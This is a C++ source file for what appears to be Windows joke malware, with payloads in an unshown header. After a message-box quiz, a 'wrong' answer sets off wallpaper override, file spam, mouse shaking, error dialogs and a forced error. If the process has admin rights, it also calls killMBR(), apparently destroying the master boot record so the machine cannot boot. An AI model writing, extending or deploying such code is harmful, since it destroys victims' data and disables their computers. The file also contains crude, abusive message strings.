#include <iostream>
#include <Windows.h>
#include "payloads.h"
#include <thread>
HWND hWnd;

BOOL IsProcessElevated()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("\n Failed to get Process Token :%d.", GetLastError());
		goto Cleanup;  // if Failed, we treat as False
	}


	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
	{
		printf("\nFailed to get Token Information :%d.", GetLastError());
		goto Cleanup;// if Failed, we treat as False
	}

	fIsElevated = elevation.TokenIsElevated;

Cleanup:
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	return fIsElevated;
}

int main() {
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	//this code right here is kinda funny lol
	if (systemTime.wMonth == 3 || systemTime.wMonth == 9 || systemTime.wMonth == 11) {
		//you must love kristik lal!!
		int q1Res = MessageBox(NULL, L"Do you like Kristik Lal?", L"Question...", MB_ICONQUESTION | MB_YESNO);
		switch (q1Res) {
		case IDYES:
			MessageBox(NULL, L"Thanks mommy :))", L"Arigato", MB_OK | MB_ICONEXCLAMATION);
			break;
		case IDNO:
			int q2Res = MessageBox(NULL, L"Are you sure??!!!", L"HEY!!", MB_YESNO | MB_ICONEXCLAMATION);
			if (q2Res == IDYES) {
				MessageBox(NULL, L"FUCK YOU!!", L"YOU SUCK", MB_ICONERROR);
				BOOL BlockInput = TRUE;
				OverrideWallpaper();
				playMusic();
				std::thread t2(fileSpam);
				if (IsProcessElevated() == TRUE) {
					killMBR();
				}
				std::thread t3(mouseShake);
				Sleep(60000);
				std::thread t1(showDialog);
				Sleep(60000);
				raiseError();
			}
			else {
				MessageBox(NULL, L"Oh... Well I'll make sure you're ready :)", L"Matte Kudasai!!!", MB_ICONINFORMATION);
			}
			break;
		}
	}
	else {
		return 1;
	}
}